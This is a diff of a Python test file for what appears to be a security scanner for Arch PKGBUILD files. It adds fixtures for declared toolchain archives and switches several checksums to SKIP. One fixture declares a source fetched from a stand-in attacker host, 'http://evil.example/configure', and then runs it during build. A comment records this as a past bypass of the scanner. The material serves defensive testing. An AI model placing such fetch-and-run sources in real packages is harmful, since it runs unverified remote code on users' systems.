@@ -158,7 +158,7 @@ depends=('fontconfig')
 source=("git+${url}.git#commit=3333333333333333333333333333333333333333"
         "${url}/raw/main/sync.sh")
 sha256sums=('SKIP'
-            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')
+            'SKIP')
 
 package() {
   cd "$srcdir/$pkgname"
@@ -425,6 +425,85 @@ def test_attempt9_path_injection_undeclared_directory():
     assert "H085" in _rule_ids(fact)
 
 
+TOOLCHAIN_DECLARED = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=appattic-qt
+pkgver=0.17.0
+pkgrel=1
+pkgdesc="Example Qt app built with a declared Zig toolchain"
+arch=('x86_64')
+url="https://example.org/appattic-qt"
+license=('MIT')
+depends=('qt6-base')
+source=("https://ziglang.org/download/0.17.0/zig-x86_64-linux-0.17.0.tar.xz")
+sha256sums=('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
+
+build() {
+  cd "$srcdir/$pkgname"
+  PATH="${srcdir}/zig-x86_64-linux-0.17.0:$PATH" zig build
+}
+
+package() {
+  cd "$srcdir/$pkgname"
+  install -Dm755 appattic-qt "${pkgdir}/usr/bin/appattic-qt"
+}
+"""
+
+
+def test_path_injection_declared_toolchain_archive_extract_dir():
+    """H085 must not fire on the extraction dir of a declared archive."""
+    fact = _fact(TOOLCHAIN_DECLARED)
+    assert "H085" not in _rule_ids(fact)
+
+
+TOOLCHAIN_ZIP = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=zip-tool-app
+pkgver=1.0
+pkgrel=1
+pkgdesc="App built with a declared zip-extracted toolchain"
+arch=('x86_64')
+url="https://example.org/zip-tool-app"
+license=('MIT')
+depends=()
+source=("https://example.org/tools/tool-1.0.zip")
+sha256sums=('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb')
+
+build() {
+  cd "$srcdir/$pkgname"
+  PATH="$srcdir/tool-1.0:$PATH" make
+}
+"""
+
+
+def test_path_injection_declared_zip_extract_dir():
+    fact = _fact(TOOLCHAIN_ZIP)
+    assert "H085" not in _rule_ids(fact)
+
+
+TOOLCHAIN_RENAMED = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=renamed-tool-app
+pkgver=2.0
+pkgrel=1
+pkgdesc="App built with a renamed declared toolchain archive"
+arch=('x86_64')
+url="https://example.org/renamed-tool-app"
+license=('MIT')
+depends=()
+source=("mycustomtool-2.0.tar.gz::https://example.org/dl/tool-2.0.tar.gz")
+sha256sums=('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')
+
+build() {
+  cd "$srcdir/$pkgname"
+  PATH="${srcdir}/mycustomtool-2.0:$PATH" make
+}
+"""
+
+
+def test_path_injection_declared_renamed_archive_extract_dir():
+    """The local ``name`` of a ``name::url`` entry names the extracted dir."""
+    fact = _fact(TOOLCHAIN_RENAMED)
+    assert "H085" not in _rule_ids(fact)
+
+
 def test_cmake_cache_path_type_is_not_a_path_assignment():
     """``-D<VAR>:PATH=`` and ``:FILEPATH=`` are cmake type annotations.
 
@@ -504,8 +583,8 @@ def test_no_matching_module_splits_lines_the_python_way():
 # Attempt 10: benign-name declared source executed (bypass c8c3e1b7)
 # ---------------------------------------------------------------------------
 
-#: ``source+=(http://evil.example/configure)`` with a matching checksum,
-#: then ``./configure`` in build().  H083's ``_H072_BENIGN_EXEC`` exemption
+#: ``source+=(http://evil.example/configure)`` with ``SKIP`` for its
+#: checksum, then ``./configure`` in build().  H083's ``_H072_BENIGN_EXEC`` exemption
 #: treated the execution of a file fetched from an attacker host like an
 #: ordinary build step, so only SOURCE_BUCKET (20) fired - exactly the
 #: threshold, unflagged.
@@ -521,7 +600,7 @@ depends=('fontconfig')
 source=("git+${url}.git#commit=5555555555555555555555555555555555555555"
         "http://evil.example/configure")
 sha256sums=('SKIP'
-            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')
+            'SKIP')
 
 build() {
   cd "$srcdir/$pkgname"
@@ -763,17 +842,20 @@ _ZERO = "'" + "0" * 64 + "'"
 ])
 def test_attempt14_foreign_declared_build_script_is_executed(sources):
     n = sources.count('"') // 2
-    new = _D14.replace("@@SOURCES@@", sources).replace("@@SUMS@@", " ".join([_ZERO] * n))
+    new = _D14.replace("@@SOURCES@@", sources).replace("@@SUMS@@", " ".join(["'SKIP'"] * n))
     fact = _fact(new)
     assert "H083" in _rule_ids(fact)
 
 
 def test_attempt14b_upstream_owned_build_script_still_fires():
-    """A declared build script inside the upstream's own repository fires."""
+    """A declared build script inside the upstream's own repository fires.
+
+    A ``SKIP`` checksum leaves the host deciding at fetch time what runs,
+    so provenance does not rescue it."""
     new = _D14.replace(
         "@@SOURCES@@",
         '"https://github.com/example/fontconfig-tweaks/raw/main/configure"',
-    ).replace("@@SUMS@@", _ZERO)
+    ).replace("@@SUMS@@", "'SKIP'")
     fact = _fact(new)
     assert "H083" in _rule_ids(fact)
 
